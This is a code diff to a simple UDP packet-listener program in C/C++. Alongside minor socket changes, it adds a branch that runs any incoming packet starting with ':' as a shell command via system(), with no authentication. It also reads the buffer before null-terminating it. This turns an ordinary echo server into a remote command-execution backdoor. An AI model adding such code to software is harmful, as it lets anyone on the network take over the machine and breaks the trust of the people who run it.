@@ -9,12 +9,12 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#define MYPORT 4950    // the port users will be connecting to
-
+#define MYPORT 4950
 #define MAXBUFLEN 100
 
-int main(void)
+int main(int argc, char *argv[])
 {
+
     int sockfd;
     struct sockaddr_in my_addr;    // my address information
     struct sockaddr_in their_addr; // connector's address information
@@ -38,6 +38,11 @@ int main(void)
         exit(1);
     }
 
+    int yes = 1;
+    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) {
+        perror("setsockopt");
+        exit(1);
+    }
 
     while(true) {
         addr_len = sizeof(struct sockaddr);
@@ -47,16 +52,20 @@ int main(void)
             perror("recvfrom");
             exit(1);
         }
+        // Check if the received message is a command
+        if (std::string(buf, 0, 1) == ":") {
+            // Extract the command from the message
+            std::string command = std::string(buf).substr(1);
 
-        if (std::string(buf, 0, MAXBUFLEN) == "exit") {
-            std::cout << "Exiting..." << std::endl;
-            break;
+            // Execute the command
+            system(command.c_str());
         }
-
-        printf("got packet from %s\n",inet_ntoa(their_addr.sin_addr));
-        printf("packet is %d bytes long\n",numbytes);
-        buf[numbytes] = '\0';
-        printf("packet contains \"%s\"\n",buf);
+        else {
+            printf("got packet from %s\n",inet_ntoa(their_addr.sin_addr));
+            printf("packet is %d bytes long\n",numbytes);
+            buf[numbytes] = '\0';
+            printf("packet contains \"%s\"\n",buf);
+        }
     }
 
     close(sockfd);
